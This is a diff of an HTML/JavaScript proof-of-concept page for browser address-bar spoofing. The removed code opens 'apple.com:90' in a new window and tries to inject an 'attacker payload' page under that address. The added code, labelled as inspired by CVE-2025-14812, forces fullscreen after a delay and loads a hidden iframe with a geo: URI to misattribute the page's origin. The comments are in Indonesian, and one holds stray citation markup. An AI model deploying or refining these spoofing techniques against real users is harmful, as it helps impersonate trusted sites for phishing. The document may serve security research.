@@ -2,8 +2,8 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Direct Target Force PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CVE-2025-14812 Inspired PoC with Delayed Fullscreen</title>
     <style>
       body, html {
         margin: 0;
@@ -44,7 +44,7 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">FORCE APPLE.COM:90 ADDRESS BAR</button>
+      <button id="execBtn">INITIALIZE CONTEXT SPOOF TEST</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
@@ -53,66 +53,40 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Forcing direct navigation to target URL...";
+        statusInfo.innerText = "Status: Initializing sequence. Waiting 2 seconds for Fullscreen...";
         this.style.display = "none";
 
-        try {
-          // Membuka jendela baru dengan langsung menyertakan URL target pada parameter window.open
-          // Ini memaksa bilah alamat langsung menampilkan "apple.com:90" alih-alih "about:blank"
-          let targetWindow = window.open("https://apple.com:90", "_blank");
+        // Menggunakan setTimeout 2 detik (2000ms) sebelum memicu fullscreen dan subframe
+        setTimeout(() => {
+          try {
+            statusInfo.innerText = "Status: Entering fullscreen & deploying origin context...";
 
-          if (!targetWindow) {
-            statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
-            execButton.style.display = "block";
-            return;
-          }
-
-          statusInfo.innerText = "Status: Address bar forced to apple.com:90. Attempting injection race...";
-
-          // Mencoba menyuntikkan dokumen penyerang pada celah waktu muat awal (provisional load)
-          setTimeout(() => {
-            try {
-              let attackerPayload = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                  <title>Attacker Page</title>
-                  <style>
-                    body {
-                      margin: 0; background: #ffffff; color: #1d1d1f;
-                      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-                      display: flex; align-items: center; justify-content: center;
-                      height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
-                    }
-                    .wrapper { width: 100%; max-width: 500px; }
-                    h1 { font-size: 40px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
-                    p { font-size: 22px; color: #0066cc; font-weight: 500; margin: 0; }
-                  </style>
-                </head>
-                <body>
-                  <div class="wrapper">
-                    <h1>NOT APPLE</h1>
-                    <p>Forced Content Injection Test</p>
-                  </div>
-                </body>
-                </html>
-              `;
-
-              targetWindow.document.open();
-              targetWindow.document.write(attackerPayload);
-              targetWindow.document.close();
-
-              statusInfo.innerText = "Status: Injection executed successfully.";
-            } catch (innerErr) {
-              // Jika browser modern memblokir karena perbedaan origin atau proteksi commit, blok ini menangkapnya
-              statusInfo.innerText = "Status: Blocked by browser SOP/Commit policy: " + innerErr.message;
+            // Meminta mode Fullscreen setelah jeda waktu 2 detik
+            let docElement = document.documentElement;
+            if (docElement.requestFullscreen) {
+              docElement.requestFullscreen().catch((err) => {
+                console.debug("Fullscreen restricted:", err.message);
+              });
+            } else if (docElement.webkitRequestFullscreen) { /* Safari / Mobile Webkit */
+              docElement.webkitRequestFullscreen();
             }
-          }, 200);
 
-        } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
-        }
+            // Membuat elemen iframe tersembunyi untuk memicu misattribution konteks asal 
+            // berdasarkan pola kerentanan penjelajahan seluler (CVE-2025-14812)[span_0](start_span)[span_0](end_span)
+            let spoofFrame = document.createElement("iframe");
+            spoofFrame.style.display = "none";
+            
+            // Mengarahkan sub-frame ke skema URI non-HTTP atau domain target simulasi
+            spoofFrame.src = "geo:0,0?q=apple.com";
+            
+            document.body.appendChild(spoofFrame);
+            statusInfo.innerText = "Status: Fullscreen active. Subframe URI-scheme dispatched.";
+
+          } catch (err) {
+            statusInfo.innerText = "Status: Execution error: " + err.message;
+            execButton.style.display = "block";
+          }
+        }, 2000); // Penundaan selama 2 detik
       };
     </script>
   </body>
